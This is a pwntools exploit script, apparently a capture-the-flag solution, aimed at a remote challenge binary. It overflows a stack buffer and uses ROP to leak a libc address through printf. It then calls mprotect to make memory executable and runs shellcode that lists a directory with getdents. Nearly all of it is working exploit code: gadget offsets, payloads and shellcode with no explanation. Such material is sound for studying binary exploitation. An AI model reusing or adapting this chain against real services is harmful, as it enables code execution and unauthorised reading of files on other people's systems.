#!/bin/python
from pwn import *
import re
import string
exe = ELF('./chall_patched')
libc = ELF('./libc.so.6')
# p = process(exe.path)
p = remote('3.75.185.198',10000)
# context.terminal = ['alacritty', '-e']
# gdb.attach(p, gdbscript='''
# # b*0x401100
#            b*0x000000000040148c
# b*read+16
#            ''')
#################exploiting#####################
shellcode = asm('''

  mov rdi, 111576294961006
 push rdi
 mov rdi,8606431000579237935 
 push rdi
   mov rdi, rsp 
    mov rdi, rsp
    xor rsi,rsi 
    xor rdx, rdx 
    mov rax, 0x2
   syscall  
    
    mov rdi, rax 
    mov rdx, 0x3a98 
    mov rsi, 0x400000
    mov rax, 0x4e
    syscall


    mov rdx, rax  
    mov rax, 0x3
    syscall  

    mov    rsi, 0x400000 
    mov    rdi,1 
    mov    rax, 0x1 
    mov   rdx, 0x3a98 
	syscall   
   
    


                ''',arch = 'amd64')



pop_rdi_rsi_rdx = 0x00000000004014d9
read_plt  = 0x401100
printf_plt = 0x4010e0
fake_rbp = 0x4010e0
rw_section = 0x0000000000404a00 
rw_section2 = 0x0000000000404b00
rw_section3 = 0x0000000000404c00 
container =0x0000000000404048 
ret = 0x0000000000401526
leave_ret = 0x000000000040148c 
#####################################3
payload = b'A'*32
payload += p64(rw_section) 
payload += p64(pop_rdi_rsi_rdx) + p64(container) + p64(0) + p64(0) + p64(ret) 
payload += p64(printf_plt)  
payload +=  p64(pop_rdi_rsi_rdx) +p64(0) + p64(rw_section) + p64(0x1000)  +p64(read_plt) + p64(leave_ret)  

p.sendlineafter(b'Input:', payload)
p.recvuntil(b' ')
leak_addr =u64(p.recv(6) + b'\x00\x00')
log.info(f'leak_addr: {hex(leak_addr)}')
libc.address = leak_addr - 0x1147d0 
pop_rax = libc.address +0x0000000000045eb0  
syscall = libc.address +0x1147e0
pop_rdi = libc.address + 0x000000000002a3e5 
pop_rsi = libc.address + 0x000000000002be51 
pop_rdx = libc.address + 0x0000000000170337 
mov_rdi_rax = libc.address + 2 
###############################33


log.info(f'libc.address: {hex(libc.address)}')
log.info(f'syscall: {hex(syscall)}')
# log.info(f'stack: {hex(stack)}')

####################




payload = p64(0)
###########################
payload += p64(pop_rax)+ p64(0xa)
payload += p64(pop_rdi) + p64(0x0000000000404000)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(pop_rdx) + p64(7)
payload += p64(syscall) 
payload += b'a'*6
payload += p64(pop_rax)+ p64(0xa)
payload += p64(pop_rdi) + p64(0x0000000000403000)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(pop_rdx) + p64(7)
payload += p64(syscall) 
payload += b'a'*6
payload += p64(pop_rax)+ p64(0xa)
payload += p64(pop_rdi) + p64(0x0000000000402000)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(pop_rdx) + p64(7)
payload += p64(syscall) 
payload += b'a'*6
payload += p64(pop_rax)+ p64(0xa)
payload += p64(pop_rdi) + p64(0x0000000000400000)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(pop_rdx) + p64(7)
payload += p64(syscall) 
payload += b'a'*6
payload += p64(pop_rax)+ p64(0xa)
payload += p64(pop_rdi) + p64(0x0000000000401000)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(pop_rdx) + p64(7)
payload += p64(syscall) 
payload += b'a'*6 
payload += p64(0x0000000000404b96)
payload +=  shellcode 

p.send(payload)
printable_bytes = [byte for byte in p.recvall() if 32 <= byte <= 126 or byte in [10, 13]]
cleanlmao = bytes(printable_bytes)
clean = re.sub(b'[^a-zA-Z0-9]', b' ',cleanlmao)[6:-568]
suprclean = [ (b'/home/pwn/maze/' + b).ljust(31,b'\x00') for b in clean.split(b' ') if 1< len(b) <17  ]

print(b''.join(suprclean))

# print(cleanlmao)

##############the end###########################
p.interactive()
